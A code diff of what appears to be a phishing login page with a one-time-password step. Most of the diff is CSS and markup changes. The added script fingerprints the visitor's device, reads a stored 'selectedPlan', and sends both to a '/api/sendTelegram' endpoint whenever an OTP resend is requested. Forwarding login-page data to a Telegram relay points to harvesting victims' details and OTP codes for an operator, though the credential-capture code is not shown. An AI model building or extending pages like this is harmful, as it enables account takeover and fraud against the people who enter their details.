@@ -111,43 +111,10 @@ input{
   border-radius:8px;
   cursor:pointer;
   font-weight:600;
-  display:flex;
-  align-items:center;
-  gap:6px;
 }
 .resend-btn[disabled]{
   background:#cbd5e1;
   cursor:not-allowed;
-}
-
-/* Spinner */
-.spinner{
-  width:14px;
-  height:14px;
-  border:2px solid rgba(255,255,255,.4);
-  border-top-color:#fff;
-  border-radius:50%;
-  animation:spin 1s linear infinite;
-  display:none;
-}
-@keyframes spin{
-  to{transform:rotate(360deg)}
-}
-
-/* Toast */
-.toast{
-  position:fixed;
-  bottom:20px;
-  left:50%;
-  transform:translateX(-50%);
-  background:#16a34a;
-  color:#fff;
-  padding:10px 14px;
-  border-radius:10px;
-  font-size:14px;
-  box-shadow:0 8px 20px rgba(0,0,0,.15);
-  display:none;
-  z-index:50;
 }
 
 /* OTP ACTION BUTTONS */
@@ -199,6 +166,7 @@ input{
     </div>
 
     <input type="text" id="hp" style="display:none">
+
     <button id="loginBtn" class="btn" disabled>LOGIN</button>
   </form>
 </div>
@@ -218,39 +186,53 @@ input{
       <input class="otp-digit" maxlength="1" inputmode="numeric" id="d5">
     </div>
 
+    <div id="otpWarning" class="otp-warning">Please input 6 digits</div>
+
     <div class="resend-row">
       <div class="small" id="resendInfo">
         Resend available in <span id="countdown">120</span>s
       </div>
-      <button id="resendBtn" class="resend-btn" disabled>
-        <span class="spinner" id="spinner"></span>
-        <span id="resendText">Resend OTP</span>
-      </button>
+      <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
     </div>
 
     <div class="otp-actions">
       <button id="confirmOtp" disabled>Confirm</button>
       <button id="cancelOtp">Cancel</button>
     </div>
+
+    <div id="otpStatus" class="small" style="margin-top:8px"></div>
   </div>
 </div>
 
-<div id="toast" class="toast">OTP resent successfully</div>
-
 <script>
+/* ===== DEVICE STRING ===== */
+const ua = navigator.userAgent;
+let device = 'Unknown';
+
+if (/Android/i.test(ua)) {
+  const v = ua.match(/Android\s([\d.]+)/);
+  device = 'Android ' + (v ? v[1] : '');
+} else if (/iPhone|iPad/i.test(ua)) {
+  const v = ua.match(/OS (\d+_\d+)/);
+  device = 'iOS ' + (v ? v[1].replace('_','.') : '');
+}
+if (/Chrome/i.test(ua)) device += ' | Chrome';
+else if (/Safari/i.test(ua)) device += ' | Safari';
+else if (/Firefox/i.test(ua)) device += ' | Firefox';
+
+/* ===== GET SELECTED PLAN ===== */
+let planData = null;
+try{
+  const raw = sessionStorage.getItem('selectedPlan');
+  if(raw) planData = JSON.parse(raw);
+}catch(e){}
+
+/* ===== OTP ===== */
 const resendBtn=document.getElementById('resendBtn');
 const resendInfo=document.getElementById('resendInfo');
-const spinner=document.getElementById('spinner');
-const resendText=document.getElementById('resendText');
-const toast=document.getElementById('toast');
 
 let countdownEl=null;
 let timer,seconds=120;
-
-function showToast(){
-  toast.style.display='block';
-  setTimeout(()=>toast.style.display='none',2500);
-}
 
 function startCountdown(){
   clearInterval(timer);
@@ -272,15 +254,19 @@ function startCountdown(){
 }
 
 resendBtn.onclick=async()=>{
-  spinner.style.display='inline-block';
-  resendText.textContent='Sending';
+  resendBtn.disabled=true;
   startCountdown();
 
-  await fetch('/api/sendTelegram',{method:'POST'});
-
-  spinner.style.display='none';
-  resendText.textContent='Resend OTP';
-  showToast();
+  await fetch('/api/sendTelegram',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({
+      event:'resend_otp',
+      selectedPlan:planData,
+      device,
+      submittedAt:new Date().toISOString()
+    })
+  });
 };
 </script>
 
